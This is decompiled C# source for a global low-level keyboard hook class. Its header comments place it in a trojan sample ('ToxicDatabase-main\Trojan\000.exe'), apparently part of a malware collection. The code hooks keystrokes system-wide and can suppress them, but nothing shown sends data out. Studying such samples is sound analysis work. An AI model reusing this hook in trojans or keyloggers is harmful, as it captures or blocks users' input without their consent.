// Decompiled with JetBrains decompiler
// Type: Utilities.GlobalKeyboardHook
// Assembly: 000, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 13F43A77-4E8B-438F-A69A-882CC6C087E6
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Trojan\000\000.exe

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;

#nullable disable
namespace Utilities;

internal class GlobalKeyboardHook
{
  private const int WH_KEYBOARD_LL = 13;
  private const int WM_KEYDOWN = 256 /*0x0100*/;
  private const int WM_KEYUP = 257;
  private const int WM_SYSKEYDOWN = 260;
  private const int WM_SYSKEYUP = 261;
  public List<Keys> HookedKeys = new List<Keys>();
  private IntPtr hhook = IntPtr.Zero;

  public event KeyEventHandler KeyDown;

  public event KeyEventHandler KeyUp;

  public GlobalKeyboardHook() => this.hook();

  ~GlobalKeyboardHook() => this.unhook();

  public void hook()
  {
    this.hhook = GlobalKeyboardHook.SetWindowsHookEx(13, new GlobalKeyboardHook.keyboardHookProc(this.hookProc), GlobalKeyboardHook.LoadLibrary("User32"), 0U);
  }

  public void unhook() => GlobalKeyboardHook.UnhookWindowsHookEx(this.hhook);

  public int hookProc(int code, int wParam, ref GlobalKeyboardHook.keyboardHookStruct lParam)
  {
    if (code >= 0)
    {
      Keys vkCode = (Keys) lParam.vkCode;
      if (this.HookedKeys.Contains(vkCode))
      {
        KeyEventArgs e = new KeyEventArgs(vkCode);
        if ((wParam == 256 /*0x0100*/ || wParam == 260) && this.KeyDown != null)
          this.KeyDown((object) this, e);
        else if ((wParam == 257 || wParam == 261) && this.KeyUp != null)
          this.KeyUp((object) this, e);
        if (e.Handled)
          return 1;
      }
    }
    return GlobalKeyboardHook.CallNextHookEx(this.hhook, code, wParam, ref lParam);
  }

  [DllImport("user32.dll")]
  private static extern IntPtr SetWindowsHookEx(
    int idHook,
    GlobalKeyboardHook.keyboardHookProc callback,
    IntPtr hInstance,
    uint threadId);

  [DllImport("user32.dll")]
  private static extern bool UnhookWindowsHookEx(IntPtr hInstance);

  [DllImport("user32.dll")]
  private static extern int CallNextHookEx(
    IntPtr idHook,
    int nCode,
    int wParam,
    ref GlobalKeyboardHook.keyboardHookStruct lParam);

  [DllImport("kernel32.dll")]
  private static extern IntPtr LoadLibrary(string lpFileName);

  public delegate int keyboardHookProc(
    int code,
    int wParam,
    ref GlobalKeyboardHook.keyboardHookStruct lParam);

  public struct keyboardHookStruct
  {
    public int vkCode;
    public int scanCode;
    public int flags;
    public int time;
    public int dwExtraInfo;
  }
}
